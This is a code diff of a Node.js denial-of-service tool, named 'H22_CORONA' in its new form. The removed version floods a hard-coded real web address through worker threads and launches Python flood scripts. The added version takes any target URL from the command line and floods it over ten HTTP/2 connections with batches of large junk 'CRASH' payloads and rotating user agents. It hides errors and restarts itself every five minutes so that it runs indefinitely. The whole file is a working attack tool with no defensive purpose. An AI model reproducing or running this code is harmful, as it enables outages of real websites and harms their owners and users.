@@ -1,247 +1,201 @@
 const http2 = require('http2');
-const { Worker, isMainThread } = require('worker_threads');
-const { spawn } = require('child_process');
-const fs = require('fs');
+const { URL } = require('url');
 
-// ================= CONFIG =================
-const TARGET = "https://sts-network.vercel.app/"; // CHANGE THIS
-const H1INF_PY = "H1INF.py";
-const H1FD_PY = "H1FD.py";
-const LOG_INTERVAL = 10000; // 10 seconds
-// ==========================================
-
-class H211_CORONA {
-    constructor() {
-        this.totalReqs = 0n;
-        this.lastLog = Date.now();
+class H22_CORONA {
+    constructor(target) {
+        const url = new URL(target);
+        this.hostname = url.hostname;
+        this.target = target;
+        
         this.running = true;
-        this.workers = [];
+        this.totalReqs = 0;
+        this.lastLog = Date.now();
+        this.lastStatus = 200;
         
-        // ASCII launcher
-        this.launcher = "     ▄︻デ╦═一━";
+        // CRASH payloads
+        this.CRASH_PAYLOADS = [
+            Buffer.alloc(65535, 'A'),
+            Buffer.alloc(8192, 'X'),
+            Buffer.alloc(16384, 'Z'.repeat(16384)),
+            Buffer.from(Array.from({length: 10000}, () => Math.floor(Math.random() * 256))),
+            Buffer.alloc(50000, '\x00')
+        ];
         
-        // Generate random data
-        this.endpoints = this.genEndpoints(500);
-        this.origins = this.genOrigins(50);
+        // Color codes
+        this.colors = {
+            reset: '\x1b[0m',
+            darkMagenta: '\x1b[35m',
+            darkGreen: '\x1b[32m',
+            red: '\x1b[91m',
+            green: '\x1b[92m',
+            yellow: '\x1b[93m'
+        };
         
-        // Start
-        this.start();
+        // Create 10x HTTP/2 connections
+        this.connections = this.createConnections(10);
+        
+        // Start attack cycle with restart logic
+        this.startAttack();
     }
-    
-    genEndpoints(count) {
-        const eps = [];
-        const chars = 'abcdefghijklmnopqrstuvwxyz0123456789-_';
+
+    createConnections(count) {
+        const connections = [];
         for (let i = 0; i < count; i++) {
-            let path = '/';
-            const depth = Math.floor(Math.random() * 4) + 1;
-            for (let d = 0; d < depth; d++) {
-                let seg = '';
-                const len = Math.floor(Math.random() * 8) + 3;
-                for (let c = 0; c < len; c++) {
-                    seg += chars[Math.floor(Math.random() * chars.length)];
-                }
-                path += seg + '/';
-            }
-            path = path.slice(0, -1);
-            
-            if (Math.random() > 0.3) {
-                const params = Math.floor(Math.random() * 3) + 1;
-                path += '?';
-                for (let p = 0; p < params; p++) {
-                    const klen = Math.floor(Math.random() * 6) + 2;
-                    const vlen = Math.floor(Math.random() * 8) + 1;
-                    let key = '', val = '';
-                    for (let k = 0; k < klen; k++) key += chars[Math.floor(Math.random() * 36)];
-                    for (let v = 0; v < vlen; v++) val += chars[Math.floor(Math.random() * 36)];
-                    path += key + '=' + val;
-                    if (p < params - 1) path += '&';
-                }
-            }
-            eps.push(path);
+            try {
+                const client = http2.connect(this.target, {
+                    maxSessionMemory: 2048 * 2048,
+                    maxDeflateDynamicTableSize: 8192,
+                    maxSendHeaderBlockLength: 65536
+                });
+                
+                client.on('error', () => {});
+                connections.push(client);
+            } catch (err) {}
         }
-        return eps;
+        return connections.filter(Boolean);
     }
-    
-    genOrigins(count) {
-        const orgs = [];
-        const prefs = ['api', 'cdn', 'static', 'assets', 'data'];
-        const doms = ['com', 'net', 'org', 'io', 'app'];
-        for (let i = 0; i < count; i++) {
-            const pref = prefs[Math.floor(Math.random() * prefs.length)];
-            const num = Math.floor(Math.random() * 999);
-            const dom = doms[Math.floor(Math.random() * doms.length)];
-            orgs.push(`${pref}${num}.${dom}`);
-        }
-        return orgs;
-    }
-    
-    spawnPython(script) {
-        if (fs.existsSync(script)) {
-            const proc = spawn('python3', [script], {
-                detached: true,
-                stdio: 'ignore'
-            });
-            proc.unref();
-        }
-    }
-    
-    createWorker() {
-        const workerCode = `
-            const http2 = require('http2');
-            const { workerData } = require('worker_threads');
+
+    startAttack() {
+        const attackCycle = () => {
+            if (!this.running) return;
             
-            const endpoints = workerData.endpoints;
-            const origins = workerData.origins;
-            const target = workerData.target;
-            
-            // Create connections
-            const conns = [];
-            for (let i = 0; i < 3; i++) {
-                try {
-                    const client = http2.connect(target, {
-                        maxSessionMemory: 512 * 1024
-                    });
-                    client.on('error', () => {});
-                    conns.push(client);
-                } catch(e) {}
-            }
-            
-            function attack() {
-                for (const client of conns) {
-                    if (client.destroyed) continue;
-                    for (let i = 0; i < 25; i++) {
-                        try {
-                            const req = client.request({
-                                ':method': 'HEAD',
-                                ':path': endpoints[Math.floor(Math.random() * endpoints.length)],
-                                ':authority': origins[Math.floor(Math.random() * origins.length)]
-                            });
-                            req.on('response', () => {
-                                req.close();
-                                if (process.send) process.send(1);
-                            });
-                            req.on('error', () => {
-                                req.close();
-                                if (process.send) process.send(1);
-                            });
-                            req.end();
-                        } catch(e) {}
+            try {
+                // Send CRASH payloads through each connection
+                for (const client of this.connections) {
+                    if (client && !client.destroyed) {
+                        // Send 150 requests per connection per batch
+                        for (let i = 0; i < 150; i++) {
+                            this.sendCRASHRequest(client);
+                            this.totalReqs++;
+                        }
                     }
                 }
-                setImmediate(attack);
+                
+                // Log every 10 seconds
+                const now = Date.now();
+                if (now - this.lastLog >= 10000) {
+                    this.lastLog = now;
+                    this.logStatus();
+                    
+                    // Force garbage collection attempt
+                    if (global.gc) global.gc();
+                }
+                
+                // Immediate next batch
+                setImmediate(attackCycle);
+            } catch (error) {
+                // Restart on any failure
+                setTimeout(() => {
+                    this.restartConnections();
+                    attackCycle();
+                }, 100);
             }
-            
-            attack();
-        `;
+        };
         
-        const worker = new Worker(workerCode, {
-            eval: true,
-            workerData: {
-                endpoints: this.endpoints,
-                origins: this.origins,
-                target: TARGET
-            }
-        });
-        
-        worker.on('message', (count) => {
-            this.totalReqs += BigInt(count);
-        });
-        
-        worker.on('error', () => {});
-        worker.on('exit', () => {});
-        
-        return worker;
+        attackCycle();
     }
-    
-    start() {
-        // Start Python
-        this.spawnPython(H1INF_PY);
-        this.spawnPython(H1FD_PY);
+
+    sendCRASHRequest(client) {
+        try {
+            const payload = this.CRASH_PAYLOADS[Math.floor(Math.random() * this.CRASH_PAYLOADS.length)];
+            const req = client.request({
+                ':method': 'POST',
+                ':path': '/' + Math.random().toString(36).substring(7),
+                ':authority': this.hostname,
+                'content-length': payload.length,
+                'user-agent': this.getRandomUA()
+            });
+            
+            req.write(payload);
+            
+            req.on('response', (headers) => {
+                this.lastStatus = headers[':status'] || 200;
+            });
+            
+            req.on('error', () => {
+                this.lastStatus = '*.*';
+            });
+            
+            req.end();
+        } catch (err) {
+            this.lastStatus = '*.*';
+        }
+    }
+
+    getRandomUA() {
+        const agents = [
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
+            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
+            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/537.36'
+        ];
+        return agents[Math.floor(Math.random() * agents.length)];
+    }
+
+    restartConnections() {
+        for (const client of this.connections) {
+            try {
+                if (client && !client.destroyed) client.destroy();
+            } catch (e) {}
+        }
+        this.connections = this.createConnections(10);
+    }
+
+    logStatus() {
+        const prefix = `${this.colors.darkMagenta}H22_CORONA${this.colors.reset}:${this.colors.darkGreen}${this.totalReqs}${this.colors.reset} ---> `;
         
-        // Create workers
-        const cores = Math.max(1, require('os').cpus().length);
-        for (let i = 0; i < cores; i++) {
-            this.workers.push(this.createWorker());
+        let statusColor = this.colors.green;
+        let statusText = this.lastStatus;
+        
+        if (statusText === '*.*') statusColor = this.colors.red;
+        else if (typeof statusText === 'number') {
+            if (statusText >= 500) statusColor = this.colors.red;
+            else if (statusText >= 400) statusColor = this.colors.red;
+            else if (statusText >= 300) statusColor = this.colors.yellow;
+            else if (statusText >= 200) statusColor = this.colors.green;
         }
         
-        // Start logging
-        this.startLogging();
-        
-        // Minimal main thread attack
-        this.lightAttack();
+        console.log(prefix + `${statusColor}${statusText}${this.colors.reset}`);
     }
-    
-    lightAttack() {
-        try {
-            const client = http2.connect(TARGET);
-            client.on('error', () => {});
-            
-            const attack = () => {
-                if (!this.running) return;
-                try {
-                    const req = client.request({
-                        ':method': 'HEAD',
-                        ':path': this.endpoints[Math.floor(Math.random() * this.endpoints.length)],
-                        ':authority': this.origins[Math.floor(Math.random() * this.origins.length)]
-                    });
-                    req.on('response', () => {
-                        req.close();
-                        this.totalReqs++;
-                    });
-                    req.on('error', () => {
-                        req.close();
-                        this.totalReqs++;
-                    });
-                    req.end();
-                } catch(e) {}
-                setImmediate(attack);
-            };
-            
-            attack();
-        } catch(e) {}
-    }
-    
-    startLogging() {
-        setInterval(() => {
-            const formatted = this.totalReqs.toLocaleString('en-US');
-            process.stdout.write(`\r\x1b[35mM2M11\x1b[0m${this.launcher} ---> \x1b[32m${formatted}\x1b[0m`);
-        }, LOG_INTERVAL);
-    }
-    
+
     stop() {
         this.running = false;
-        this.workers.forEach(w => {
-            try { w.terminate(); } catch(e) {}
-        });
-        try {
-            require('child_process').execSync(`pkill -f "${H1INF_PY}"`);
-            require('child_process').execSync(`pkill -f "${H1FD_PY}"`);
-        } catch(e) {}
+        for (const client of this.connections) {
+            try {
+                if (client && !client.destroyed) client.destroy();
+            } catch (e) {}
+        }
     }
 }
 
-// Main
-if (isMainThread) {
-    // Silence all startup logs
-    const originalLog = console.log;
-    console.log = () => {};
-    
-    const corona = new H211_CORONA();
-    
-    // Restore console.log after startup
-    setTimeout(() => {
-        console.log = originalLog;
-    }, 100);
-    
-    // Shutdown
-    process.on('SIGINT', () => {
-        corona.stop();
-        process.exit(0);
-    });
-    
+// Run forever with restart
+if (require.main === module) {
     process.on('uncaughtException', () => {});
     process.on('unhandledRejection', () => {});
     
-    // Memory
-    require('v8').setFlagsFromString('--max-old-space-size=4096');
-                    }
+    require('v8').setFlagsFromString('--max-old-space-size=8192');
+    
+    if (process.argv.length < 3) {
+        console.log('Usage: node H22_CORONA.js https://target.com');
+        process.exit(1);
+    }
+    
+    const target = process.argv[2];
+    
+    const runForever = () => {
+        const corona = new H22_CORONA(target);
+        
+        // Auto-restart every 5 minutes
+        setTimeout(() => {
+            corona.stop();
+            setTimeout(runForever, 1000);
+        }, 300000);
+    };
+    
+    runForever();
+    
+    process.on('SIGINT', () => {
+        console.log('\nH22_CORONA stopped.');
+        process.exit(0);
+    });
+            }
